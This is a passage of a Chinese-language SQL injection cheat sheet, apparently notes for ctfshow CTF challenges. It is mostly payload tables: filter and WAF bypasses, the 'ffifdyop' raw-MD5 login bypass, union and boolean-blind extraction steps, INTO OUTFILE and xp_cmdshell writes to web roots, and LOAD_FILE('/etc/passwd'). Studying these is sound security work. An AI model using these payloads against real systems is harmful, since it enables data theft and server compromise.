<td><code>/* 注释 */</code></td>
<td>安全可靠，推荐使用</td>
</tr>
<tr>
<td>多余逻辑结束</td>
<td><code>'or'1'='1'</code></td>
<td>直接闭合，无需注释</td>
</tr>
<tr>
<td>–%0c或者–%01</td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<h4 id="3对where的替代"><a class="markdownIt-Anchor" href="#3对where的替代"></a> 3.对where的替代:</h4>
<h5 id="1使用having"><a class="markdownIt-Anchor" href="#1使用having"></a> 1.使用having :</h5>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username, <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">AS</span> user_count</span><br><span class="line"><span class="keyword">FROM</span> users</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> username</span><br><span class="line"><span class="keyword">HAVING</span> user_count <span class="operator">&gt;</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">表名 <span class="keyword">group</span> <span class="keyword">by</span> 查询的数据 <span class="keyword">having</span> 添加条件，只返回符合条件的数据</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="2使用regexp"><a class="markdownIt-Anchor" href="#2使用regexp"></a> 2.使用regexp:</h5>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">表名 <span class="keyword">group</span> <span class="keyword">by</span> 查询的数据 <span class="keyword">having</span> regexp  ，只返回符合条件的数据</span><br><span class="line"><span class="string">&#x27; AND (SELECT 字段 FROM 表名 LIMIT 0,1) REGEXP &#x27;</span> <span class="string">&#x27; -- </span></span><br><span class="line"><span class="string">regexp和like的区别:</span></span><br><span class="line"><span class="string">       like ctfshow&#123;%      --必须增加%作为匹配</span></span><br><span class="line"><span class="string">       regexp ctfshow&#123;     --可以加^或者不加</span></span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th style="text-align:left">项目</th>
<th style="text-align:left">内容</th>
<th style="text-align:left">示例</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">作用</td>
<td style="text-align:left"><strong>用正则表达式匹配字符串</strong></td>
<td style="text-align:left"><code>WHERE username REGEXP '^admin'</code></td>
</tr>
<tr>
<td style="text-align:left">匹配规则</td>
<td style="text-align:left">只要<strong>部分内容匹配</strong>就算成功，不是要求全字段完全一致！</td>
<td style="text-align:left"><code>'ctfshow&#123;123&#125;'</code> 匹配到<code>'ctfshow'</code>也算成功</td>
</tr>
<tr>
<td style="text-align:left">大小写敏感？</td>
<td style="text-align:left"><strong>不敏感</strong>（MySQL默认情况下）</td>
<td style="text-align:left"><code>REGEXP 'CTF'</code>可以匹配<code>ctfshow</code></td>
</tr>
<tr>
<td style="text-align:left">匹配字符</td>
<td style="text-align:left"><strong>单字符/多字符</strong>均可</td>
<td style="text-align:left"><code>REGEXP 'c'</code> 匹配到 <code>ctfshow</code></td>
</tr>
<tr>
<td style="text-align:left">正则语法</td>
<td style="text-align:left">类似常规正则，但MySQL支持的是<strong>简化版</strong></td>
<td style="text-align:left">比如<code>^</code>、<code>$</code>、<code>[abc]</code>、<code>.</code>、<code>*</code>、<code>+</code>等</td>
</tr>
<tr>
<td style="text-align:left">多模式支持</td>
<td style="text-align:left">可以用`</td>
<td style="text-align:left">`符号，表示<strong>或</strong>匹配</td>
</tr>
<tr>
<td style="text-align:left">特殊字符</td>
<td style="text-align:left">部分正则特殊符号要加转义（如<code>.</code>，<code>*</code>）</td>
<td style="text-align:left"><code>REGEXP '\\.'</code> 匹配真正的小数点</td>
</tr>
<tr>
<td style="text-align:left">空字符串</td>
<td style="text-align:left"><code>'' REGEXP 'a'</code> ➔ 返回<code>false</code>（空的不匹配任何字符）</td>
<td style="text-align:left">-</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th style="text-align:left">正则符号</th>
<th style="text-align:left">意义</th>
<th style="text-align:left">示例</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>.</code></td>
<td style="text-align:left">匹配<strong>任意单个字符</strong></td>
<td style="text-align:left"><code>'a.b'</code> ➔ <code>acb</code>, <code>a1b</code>, <code>a-b</code>都匹配</td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left"><code>*</code></td>
<td style="text-align:left"><strong>前一个字符重复0次或多次</strong></td>
<td style="text-align:left"><code>'ab*c'</code> ➔ <code>ac</code>, <code>abc</code>, <code>abbbc</code>都匹配</td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left"><code>+</code></td>
<td style="text-align:left"><strong>前一个字符重复1次或多次</strong></td>
<td style="text-align:left"><code>'ab+c'</code> ➔ <code>abc</code>, <code>abbbc</code>匹配，但<code>ac</code>不匹配</td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left"><code>?</code></td>
<td style="text-align:left"><strong>前一个字符出现0次或1次</strong></td>
<td style="text-align:left"><code>'ab?c'</code> ➔ <code>ac</code>, <code>abc</code>匹配</td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left">`</td>
<td style="text-align:left">`</td>
<td style="text-align:left"><strong>或</strong>，满足任一模式即可</td>
<td style="text-align:left">`'abc</td>
</tr>
<tr>
<td style="text-align:left"><code>[]</code></td>
<td style="text-align:left"><strong>字符集合</strong>，匹配其中任意一个</td>
<td style="text-align:left"><code>'[abc]'</code> 匹配a或b或c</td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left"><code>[^]</code></td>
<td style="text-align:left"><strong>取反字符集合</strong></td>
<td style="text-align:left"><code>'[^abc]'</code> 匹配除了a/b/c之外的字符</td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left"><code>^</code></td>
<td style="text-align:left">匹配<strong>开头</strong></td>
<td style="text-align:left"><code>'^ctf'</code> 匹配以<code>ctf</code>开头</td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left"><code>$</code></td>
<td style="text-align:left">匹配<strong>结尾</strong></td>
<td style="text-align:left"><code>'ctf$'</code> 匹配以<code>ctf</code>结尾</td>
<td style="text-align:left"></td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th style="text-align:left">场景</th>
<th style="text-align:left">使用方式</th>
<th style="text-align:left">例子</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">爆破flag</td>
<td style="text-align:left">构造正则判断一位字符是否正确</td>
<td style="text-align:left"><code>having pass regexp '^c'</code></td>
</tr>
<tr>
<td style="text-align:left">绕过WAF</td>
<td style="text-align:left">把payload变复杂，避开简单检测</td>
<td style="text-align:left"><code>regexp(concat(char(...)))</code></td>
</tr>
<tr>
<td style="text-align:left">盲注猜数据</td>
<td style="text-align:left">通过正则变化，逐字符爆破</td>
<td style="text-align:left">正则从头匹配flag字符</td>
</tr>
</tbody>
</table>
<h4 id="4对字符串的绕过字符串拼接"><a class="markdownIt-Anchor" href="#4对字符串的绕过字符串拼接"></a> 4.对’'字符串的绕过,字符串拼接:</h4>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">使用字符串拼接，得到的只是字符串，不会执行</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>x开头的十六进制字面量，在MySQL中自动解释为字符串 </span><br><span class="line"><span class="number">0x63746673686f777b25</span> <span class="operator">=</span> <span class="string">&#x27;ctfshow&#123;%&#x27;</span></span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
<th>示例</th>
<th>是否推荐</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>CONCAT()</code></td>
<td>字符串拼接</td>
<td><code>CONCAT('s','elect')</code></td>
<td>✅ 推荐，兼容性高</td>
</tr>
<tr>
<td><code>CONCAT_WS()</code></td>
<td>自带分隔符拼接</td>
<td><code>CONCAT_WS('', 's','elect')</code></td>
<td>✅ 更隐蔽</td>
</tr>
<tr>
<td><code>CHAR()</code></td>
<td>以ASCII构造字符</td>
<td><code>CHAR(115,101,108,101,99,116)</code></td>
<td>✅ 强绕过能力</td>
</tr>
<tr>
<td><code>0x</code>十六进制</td>
<td>直接用16进制</td>
<td><code>0x73656c656374</code></td>
<td>✅ WAF绕过首选之一</td>
</tr>
<tr>
<td><code>ELT()/FIELD()</code></td>
<td>字符选择构造</td>
<td><code>ELT(1,'select','union')</code></td>
<td>⚠️ 有技巧</td>
</tr>
<tr>
<td><code>REPEAT()/LPAD()/RPAD()</code></td>
<td>利用字符串函数拼接关键字</td>
<td><code>REPEAT('sel',1) + REPEAT('ect',1)</code></td>
<td>⚠️ 有局限</td>
</tr>
<tr>
<td><code>CONV(N,10,36)</code></td>
<td>进制转换得到关键字</td>
<td><code>CONV(1234567,10,36)</code> → <code>select</code></td>
<td>⚠️ 可用，但不直观</td>
</tr>
<tr>
<td><code>MID()/SUBSTRING()</code></td>
<td>子串拼接组合</td>
<td><code>MID('selectfrom',1,6)</code></td>
<td>⚠️ 少用</td>
</tr>
<tr>
<td><code>GROUP_CONCAT()</code></td>
<td>聚合拼接（配合盲注）</td>
<td><code>GROUP_CONCAT(schema_name)</code></td>
<td>✅ 在盲注中常用</td>
</tr>
<tr>
<td><code>CASE WHEN THEN</code></td>
<td>拼接关键字条件构造</td>
<td><code>CASE WHEN 1 THEN 'sel' ELSE 'foo' END</code></td>
<td>⚠️ 绕过防护场景用</td>
</tr>
</tbody>
</table>
<h4 id="5对数字的过滤"><a class="markdownIt-Anchor" href="#5对数字的过滤"></a> 5.对数字的过滤 ：</h4>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="literal">false</span>	                         <span class="number">0</span></span><br><span class="line"><span class="literal">true</span>	                         <span class="number">1</span></span><br><span class="line"><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span>	                     <span class="number">2</span></span><br><span class="line"><span class="built_in">floor</span>(pi())	                     <span class="number">3</span></span><br><span class="line"><span class="built_in">ceil</span>(pi())	                     <span class="number">4</span></span><br><span class="line"><span class="built_in">floor</span>(pi())<span class="operator">+</span><span class="literal">true</span>	             <span class="number">5</span></span><br><span class="line"><span class="built_in">floor</span>(pi())<span class="operator">+</span><span class="built_in">floor</span>(pi())	         <span class="number">6</span></span><br><span class="line"><span class="built_in">floor</span>(pi())<span class="operator">+</span><span class="built_in">ceil</span>(pi())	         <span class="number">7</span></span><br><span class="line"><span class="built_in">ceil</span>(pi())<span class="operator">+</span><span class="built_in">ceil</span>(pi())	         <span class="number">8</span></span><br><span class="line"><span class="built_in">floor</span>(pi())<span class="operator">*</span><span class="built_in">floor</span>(pi())	         <span class="number">9</span></span><br><span class="line"><span class="built_in">floor</span>(pi())<span class="operator">*</span><span class="built_in">floor</span>(pi())<span class="operator">+</span><span class="literal">true</span>	<span class="number">10</span></span><br></pre></td></tr></table></figure>
<h4 id="6-对输入的数据md5"><a class="markdownIt-Anchor" href="#6-对输入的数据md5"></a> 6. 对输入的数据md5()</h4>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$password <span class="operator">=</span> md5($_POST[<span class="string">&#x27;password&#x27;</span>],<span class="literal">true</span>);</span><br><span class="line">      <span class="comment">--如果可选的binary被设置为true 那么md5摘要将以16字符长度的原始二进制格式返回</span></span><br><span class="line">md5(&quot;ffifdyop&quot;,<span class="literal">true</span>) <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;or&#x27;</span><span class="number">6</span>É]é<span class="operator">!</span>r,ùíb</span><br></pre></td></tr></table></figure>
<h4 id="7mysql中字符串与数字进行比较"><a class="markdownIt-Anchor" href="#7mysql中字符串与数字进行比较"></a> 7.mysql中字符串与数字进行比较:</h4>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">以字母开头的字符串都会转换成数字<span class="number">0</span> </span><br></pre></td></tr></table></figure>
<h4 id="8substr函数的过滤"><a class="markdownIt-Anchor" href="#8substr函数的过滤"></a> 8.substr()函数的过滤:</h4>
<table>
<thead>
<tr>
<th>方法</th>
<th>替代语法</th>
<th>说明</th>
<th>是否推荐</th>
</tr>
</thead>
<tbody>
<tr>
<td>✅ <strong><code>mid()</code></strong></td>
<td><code>mid((SELECT f1ag...), 1, 1) = 'c'</code></td>
<td>和 <code>substr</code> 完全一样</td>
<td>✅强推荐</td>
</tr>
<tr>
<td>✅ <strong><code>left()</code></strong></td>
<td><code>left((SELECT f1ag...), 1) = 'c'</code></td>
<td>判断开头第1位</td>
<td>✅推荐</td>
</tr>
<tr>
<td>✅ <strong><code>like</code></strong></td>
<td><code>(SELECT f1ag...) LIKE 'c%'</code></td>
<td>判断以 <code>c</code> 开头</td>
<td>✅推荐</td>
</tr>
<tr>
<td>✅ <strong><code>regexp</code></strong></td>
<td><code>(SELECT f1ag...) REGEXP '^c'</code></td>
<td>正则匹配开头</td>
<td>✅推荐</td>
</tr>
<tr>
<td>✅ <strong><code>ascii()</code></strong></td>
<td><code>ascii(mid((SELECT f1ag...), 1, 1)) = 99</code></td>
<td>判断字符 ASCII</td>
<td>✅适合盲注</td>
</tr>
<tr>
<td>✅ <strong><code>left(...) regexp</code></strong></td>
<td><code>left((SELECT ...), 3) REGEXP '^ctf'</code></td>
<td>混合正则判断前缀</td>
<td>✅推荐</td>
</tr>
</tbody>
</table>
<h4 id="9对等号的过滤"><a class="markdownIt-Anchor" href="#9对等号的过滤"></a> 9.对等号=的过滤:</h4>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>替代形式</th>
<th>示例</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>LIKE</code></td>
<td><code>id LIKE 1</code></td>
<td>功能上与 <code>=</code> 相似，特别是在数值对比中可生效</td>
</tr>
<tr>
<td><code>IN</code></td>
<td><code>id IN (1)</code></td>
<td>在单值时等价于 <code>=</code>，但语法结构不同</td>
</tr>
<tr>
<td><code>BETWEEN</code></td>
<td><code>id BETWEEN 1 AND 1</code></td>
<td>等价于 <code>id = 1</code>，可绕过等号过滤</td>
</tr>
<tr>
<td><code>&gt; -1 AND id &lt; 2</code></td>
<td><code>id &gt; 0 AND id &lt; 2</code></td>
<td>逻辑等价于 <code>id = 1</code>，但更绕</td>
</tr>
<tr>
<td><code>NOT (id != 1)</code></td>
<td></td>
<td>等价于 <code>id = 1</code>，使用了逻辑反转</td>
</tr>
<tr>
<td><code>REGEXP '^1$'</code></td>
<td></td>
<td>正则匹配 1，可以替代 <code>=</code>，MySQL 专用</td>
</tr>
<tr>
<td><code>STRCMP(id, 1) = 0</code></td>
<td></td>
<td>字符串比较函数，结果为 0 表示相等</td>
</tr>
<tr>
<td><code>FIND_IN_SET(id, '1')</code></td>
<td></td>
<td>如果 <code>id</code> 是 1，命中单元素列表</td>
</tr>
<tr>
<td><code>CASE WHEN id=1 THEN 1 ELSE 0 END</code></td>
<td></td>
<td>也可用于布尔判断绕过结构</td>
</tr>
<tr>
<td><code>BINARY</code></td>
<td><code>BINARY id LIKE BINARY 1</code></td>
<td>强制区分大小写，比对更严格，WAF可能绕不过但可混淆语义</td>
</tr>
</tbody>
</table>
<h4 id="10对sleep的绕过"><a class="markdownIt-Anchor" href="#10对sleep的绕过"></a> 10.对sleep的绕过;</h4>
<table>
<thead>
<tr>
<th>方法</th>
<th>绕过 payload</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>✅ 编码函数</td>
<td><code>/*!sleep*/(3)</code></td>
<td>MySQL 会解析 <code>/*!...*/</code> 语法注释（版本条件注释）</td>
</tr>
<tr>
<td>✅ 分隔符拼接</td>
<td><code>sl/**/eep(3)</code></td>
<td>利用 SQL 注释分隔关键字</td>
</tr>
<tr>
<td>✅ 大小写变形</td>
<td><code>sLeEp(3)</code></td>
<td>如果没有 <code>i</code> 选项会绕过（此例不可行）</td>
</tr>
<tr>
<td>✅ 字符串拼接</td>
<td>`s’</td>
<td></td>
</tr>
<tr>
<td>✅ 使用 HEX</td>
<td><code>0x736c656570</code></td>
<td><code>'sleep'</code> 的 hex 编码，不直接触发 regex</td>
</tr>
<tr>
<td>✅ 使用变量定义</td>
<td><code>@s:='sleep', @s(3)</code></td>
<td>如果 SQL 支持变量调用函数（MySQL支持有限）</td>
</tr>
<tr>
<td>✅ 利用其他延迟函数</td>
<td><code>benchmark(99999999,MD5(1))</code></td>
<td>替代 sleep 达成盲注延时效果</td>
</tr>
</tbody>
</table>
<h4 id="11使用预处理语句执行字符串"><a class="markdownIt-Anchor" href="#11使用预处理语句执行字符串"></a> 11.使用预处理语句执行字符串:</h4>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">在 MySQL 中，<span class="keyword">PREPARE</span> 和 <span class="keyword">EXECUTE</span> 就是用来执行字符串拼接出来的动态<span class="keyword">SQL</span>语句的机制。</span><br><span class="line"><span class="keyword">PREPARE</span> stmt <span class="keyword">FROM</span> &quot;SELECT database()&quot;;  </span><br><span class="line"><span class="keyword">EXECUTE</span> stmt;</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>步骤</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td><code>PREPARE</code> 会把<strong>字符串当作SQL语句</strong>重新编译</td>
</tr>
<tr>
<td>2</td>
<td><code>EXECUTE</code> 执行编译后的语句</td>
</tr>
</tbody>
</table>
<h4 id="12对select的绕过handler"><a class="markdownIt-Anchor" href="#12对select的绕过handler"></a> 12.对select的绕过(handler):</h4>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">HANDLER 表名 <span class="keyword">OPEN</span> [ [<span class="keyword">AS</span>] 别名 ];</span><br><span class="line">HANDLER 表名 READ &#123; index_name <span class="operator">|</span> <span class="keyword">PRIMARY</span> <span class="operator">|</span> NEXT <span class="operator">|</span> PREV <span class="operator">|</span> <span class="keyword">FIRST</span> <span class="operator">|</span> <span class="keyword">LAST</span> &#125;</span><br><span class="line">    [ <span class="operator">=</span> (key_value1, key_value2, ...) ]</span><br><span class="line">    [ <span class="keyword">WHERE</span> 条件 ]</span><br><span class="line">    [ LIMIT n ];</span><br><span class="line">HANDLER 表名 <span class="keyword">CLOSE</span>;</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>语法组件</th>
<th>说明</th>
<th>示例</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>OPEN</code></td>
<td>打开表句柄</td>
<td><code>HANDLER users OPEN;</code></td>
</tr>
<tr>
<td><code>READ FIRST</code></td>
<td>读第一行</td>
<td><code>HANDLER users READ FIRST;</code></td>
</tr>
<tr>
<td><code>READ NEXT</code></td>
<td>读下一行（游标前进）</td>
<td><code>HANDLER users READ NEXT;</code></td>
</tr>
<tr>
<td><code>READ PRIMARY = (...)</code></td>
<td>用主键精确查询</td>
<td><code>HANDLER users READ PRIMARY = (1);</code></td>
</tr>
<tr>
<td><code>READ index_name = (...)</code></td>
<td>用指定索引查找</td>
<td><code>HANDLER users READ idx_name = ('admin');</code></td>
</tr>
<tr>
<td><code>WHERE</code></td>
<td>条件过滤（可选）</td>
<td><code>HANDLER users READ FIRST WHERE id&gt;1;</code></td>
</tr>
<tr>
<td><code>LIMIT</code></td>
<td>限制读取条数</td>
<td><code>HANDLER users READ FIRST LIMIT 1;</code></td>
</tr>
<tr>
<td><code>CLOSE</code></td>
<td>关闭句柄</td>
<td><code>HANDLER users CLOSE;</code></td>
</tr>
</tbody>
</table>
<h4 id="13informationschema的过滤无列名查询"><a class="markdownIt-Anchor" href="#13informationschema的过滤无列名查询"></a> 13.information.schema的过滤(无列名查询):</h4>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> mysql.innodb_table_stats   <span class="comment">--表名</span></span><br><span class="line">                                                            <span class="comment">---也可以用mysql.innodb_index_stats得到表名</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> group_concat(`<span class="number">3</span>`) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名)a <span class="comment">---a别名，如果``被过滤可以通过as 设置别名</span></span><br></pre></td></tr></table></figure>
<h4 id="14sql写入文件"><a class="markdownIt-Anchor" href="#14sql写入文件"></a> 14.sql写入文件:</h4>
<h5 id="mysql"><a class="markdownIt-Anchor" href="#mysql"></a> mysql：</h5>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;ctfshow&#123;flag_here&#125;&#x27;</span> </span><br><span class="line"><span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/html/shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
<h5 id="postgresql"><a class="markdownIt-Anchor" href="#postgresql"></a> PostgreSQL:</h5>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">COPY</span> (<span class="keyword">SELECT</span> <span class="string">&#x27;ctfshow&#123;flag_here&#125;&#x27;</span>) <span class="keyword">TO</span> <span class="string">&#x27;/tmp/flag.txt&#x27;</span>;</span><br></pre></td></tr></table></figure>
<h5 id="sql-server"><a class="markdownIt-Anchor" href="#sql-server"></a> SQL Server:</h5>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;echo ctfshow&#123;pwned&#125; &gt; C:\inetpub\wwwroot\shell.aspx&#x27;</span>;</span><br></pre></td></tr></table></figure>
<h4 id="15读取文件"><a class="markdownIt-Anchor" href="#15读取文件"></a> 15.读取文件:</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">SELECT <span class="title function_ invoke__">LOAD_FILE</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>);</span><br></pre></td></tr></table></figure>
<h3 id="1基础用法"><a class="markdownIt-Anchor" href="#1基础用法"></a> 1.基础用法</h3>
<h4 id="1常见查询关键字"><a class="markdownIt-Anchor" href="#1常见查询关键字"></a> 1.常见查询关键字:</h4>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="keyword">by</span>  <span class="comment">--字段数探测,查看有多少列</span></span><br></pre></td></tr></table></figure>
<h4 id="2常见函数"><a class="markdownIt-Anchor" href="#2常见函数"></a> 2.常见函数;</h4>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> version()——MySQL版本</span><br><span class="line"><span class="number">2.</span> <span class="keyword">user</span>()——数据库用户名</span><br><span class="line"><span class="number">3.</span> database()——数据库名</span><br><span class="line"><span class="number">4.</span> @<span class="variable">@datadir</span>——数据库路径</span><br><span class="line"><span class="number">5.</span> @<span class="variable">@version_compile_os</span>——操作系统版本</span><br><span class="line"><span class="number">6.</span>concat(str1,str2,...)——没有分隔符地连接字符串</span><br><span class="line"><span class="number">7.</span>concat_ws(separator,str1,str2,...)——含有分隔符地连接字符串</span><br><span class="line"><span class="number">8.</span>group_concat(str1,str2,...)——连接一个组的所有字符串，并以逗号分隔每一条数据</span><br></pre></td></tr></table></figure>
<h3 id="2攻击方式"><a class="markdownIt-Anchor" href="#2攻击方式"></a> 2.攻击方式 ；</h3>
<h4 id="1联合注入"><a class="markdownIt-Anchor" href="#1联合注入"></a> 1.联合注入:</h4>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;数据库名&#x27;</span>;————<span class="operator">&gt;</span>爆出表名</span><br><span class="line"><span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;表名&#x27;</span>;<span class="comment">---&gt;爆出字段</span></span><br><span class="line"><span class="keyword">select</span> 所需字段 <span class="keyword">from</span> 表名 <span class="keyword">where</span> 某一个字段 <span class="operator">=</span> <span class="string">&#x27;某值&#x27;</span>       <span class="comment">--爆出某一字段的某一对应值</span></span><br></pre></td></tr></table></figure>
<h5 id="联合注入常见流程"><a class="markdownIt-Anchor" href="#联合注入常见流程"></a> 联合注入常见流程:</h5>
<table>
<thead>
<tr>
<th>步骤</th>
<th>SQL语句</th>
<th>用途说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>① 探字段数</td>
<td><code>' ORDER BY 1--+</code> 到 <code>' ORDER BY n--+</code></td>
<td>确定能用的列数</td>
</tr>
<tr>
<td>② 拼返回列</td>
<td>’ UNION SELECT 1,2,3–+</td>
<td>替换成真实字段</td>
</tr>
<tr>
<td>③ 查当前库</td>
<td>UNION SELECT 1,2,database()–+</td>
<td>爆数据库名</td>
</tr>
<tr>
<td>④ 查表名</td>
<td>group_concat(table_name) from information_schema.tables where table_schema=‘xxx’;</td>
<td>爆所有表</td>
</tr>
<tr>
<td>⑤ 查字段</td>
<td>group_concat(column_name) from information_schema.columns where table_name=‘xxx’;</td>
<td>爆所有字段</td>
</tr>
<tr>
<td>⑥ 查字段值</td>
<td>select 字段名 from 表名 where 条件</td>
<td>爆字段内容</td>
</tr>
</tbody>
</table>
<h5 id="可以直接使用like"><a class="markdownIt-Anchor" href="#可以直接使用like"></a> 可以直接使用like:</h5>
<table>
<thead>
<tr>
<th>类型</th>
<th>示例</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>精确匹配</td>
<td><code>username LIKE 'admin'</code></td>
<td>等价于 <code>=</code>，但可绕过WAF拦截 <code>=</code></td>
</tr>
<tr>
<td>前缀匹配</td>
<td><code>username LIKE 'adm%'</code></td>
<td>匹配以 <code>adm</code> 开头的内容</td>
</tr>
<tr>
<td>后缀匹配</td>
<td><code>username LIKE '%min'</code></td>
<td>匹配以 <code>min</code> 结尾的内容</td>
</tr>
<tr>
<td>中间匹配</td>
<td><code>username LIKE '%dm%'</code></td>
<td>匹配包含 <code>dm</code> 的内容</td>
</tr>
<tr>
<td>单字符匹配</td>
<td><code>username LIKE 'a_din'</code></td>
<td>匹配 <code>a+任意字符+din</code></td>
</tr>
<tr>
<td>任意位置字符匹配</td>
<td><code>flag LIKE 'ctfshow&#123;a________&#125;'</code></td>
<td>用 <code>_</code> 限定位数、位置盲注</td>
</tr>
<tr>
<td>非空匹配</td>
<td><code>flag LIKE '%'</code></td>
<td>判断是否有内容（不为空）</td>
</tr>
</tbody>
</table>
<h5 id="2对返回结果的过滤替换replace"><a class="markdownIt-Anchor" href="#2对返回结果的过滤替换replace"></a> 2.对返回结果的过滤替换(replace):</h5>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">REPLACE(str, from_str, to_str)</span><br><span class="line">                <span class="comment">-- str：原始字符串</span></span><br><span class="line">                <span class="comment">-- from_str：要替换的子串</span></span><br><span class="line">                <span class="comment">-- to_str：替换成的新子串</span></span><br><span class="line">REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(password,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;nine&#x27;</span>),<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;eight&#x27;</span>),<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;seven&#x27;</span>),<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;six&#x27;</span>),<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;five&#x27;</span>),<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;four&#x27;</span>),<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;three&#x27;</span>),<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;two&#x27;</span>),<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;one&#x27;</span>),<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;zero&#x27;</span>) <span class="keyword">from</span> ctfshow_user4 <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<h5 id="3如果对返回结果有过滤也可以将内容写入当前目录的其他的文件"><a class="markdownIt-Anchor" href="#3如果对返回结果有过滤也可以将内容写入当前目录的其他的文件"></a> 3.如果对返回结果有过滤，也可以将内容写入当前目录的其他的文件;</h5>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; union select username, password from ctfshow_user5 into outfile &#x27;</span><span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span>flag.txt<span class="string">&#x27; --+</span></span><br><span class="line"><span class="string">           --into outfile 将内容写入文件</span></span><br></pre></td></tr></table></figure>
<h4 id="2布尔盲注"><a class="markdownIt-Anchor" href="#2布尔盲注"></a> 2.布尔盲注:</h4>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">布尔盲注是一种盲<span class="keyword">SQL</span>注入攻击方式，利用服务器返回结果的真假条件判断（通常是返回页面的差异）来逐步猜测数据库中的信息。</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>攻击方法</th>
<th>攻击Payload示例</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>条件判断（Condition）</td>
<td><code>id=1 AND (SELECT COUNT(*) FROM users)&gt;0</code></td>
<td>根据返回结果真假判断条件是否成立</td>
</tr>
<tr>
<td>字符逐位猜测（逐字符判断）</td>
<td><code>username=admin' AND substr(password,1,1)='a' -- </code></td>
<td>逐字符逐步猜测密码</td>
</tr>
<tr>
<td>ASCII范围逐步缩小（折半搜索）</td>
<td><code>id=1 AND ASCII(substr((SELECT db()),1,1))&gt;97</code></td>
<td>折半搜索快速确定字符ASCII码</td>
</tr>
<tr>
<td>字符长度判断</td>
